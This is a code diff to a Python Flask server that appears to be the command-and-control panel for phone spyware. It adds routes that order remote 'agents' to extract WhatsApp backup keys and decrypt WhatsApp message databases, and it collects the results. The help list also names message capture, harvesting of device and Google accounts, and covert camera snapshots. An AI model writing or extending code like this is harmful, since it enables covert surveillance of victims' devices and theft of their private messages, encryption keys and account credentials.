@@ -478,7 +478,49 @@ def api_get_whatsapp_file(agent_id, filename):
     if os.path.exists(filepath):
         return send_file(filepath, as_attachment=True)
     return jsonify({'error': 'File not found'}), 404
+# ==================== WHATSAPP DECRYPT ROUTES ====================
 
+@app.route('/api/whatsapp_decrypt/<agent_id>', methods=['POST'])
+def api_whatsapp_decrypt(agent_id):
+    """Request WhatsApp decryption from agent"""
+    data = request.get_json()
+    action = data.get('action', 'info')  # info, extract_key, decrypt
+    
+    command_map = {
+        'info': 'WA_BACKUP_INFO',
+        'extract_key': 'WA_EXTRACT_KEY',
+        'decrypt': 'WA_DECRYPT_DB'
+    }
+    
+    command = command_map.get(action, 'WA_BACKUP_INFO')
+    
+    cmd_id = save_command(agent_id=agent_id, command=command, status='pending')
+    
+    with lock:
+        if agent_id in agents:
+            handler = agents[agent_id]
+            command_data = {
+                'id': cmd_id,
+                'command': command,
+                'timestamp': datetime.datetime.now().isoformat()
+            }
+            if handler.send_command(command_data):
+                save_command(cmd_id, status='sent')
+                return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': True})
+    
+    return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': False})
+
+@app.route('/api/whatsapp_decrypt_result/<agent_id>')
+def api_whatsapp_decrypt_result(agent_id):
+    """Get WhatsApp decryption results"""
+    results = get_results(agent_id=agent_id, limit=10)
+    decrypt_results = []
+    
+    for r in results:
+        if r['command'].startswith('WA_'):
+            decrypt_results.append(r)
+    
+    return jsonify(decrypt_results)
 # ==================== STATUS ROUTES ====================
 @app.route('/api/status')
 def api_status():
@@ -517,6 +559,9 @@ def api_help():
         "WA_CAPTURE_DUMP - Get captured WhatsApp messages",
         "WA_CAPTURE_STATS - Get capture statistics",
         "WA_CAPTURE_CLEAR - Clear captured messages",
+        "WA_BACKUP_INFO - Get Backup Key whatsapp",
+        "WA_EXTRACT_KEY - Get Key Whatsapp",
+        "WA_DECRYPT_DB - Get Decrypt Whatsapp",
         "GET_ACCOUNTS - Get device accounts",
         "GET_GOOGLE_ACCOUNTS - Get Google accounts",
         "CAMERA_SNAPSHOT - Take photo with camera",
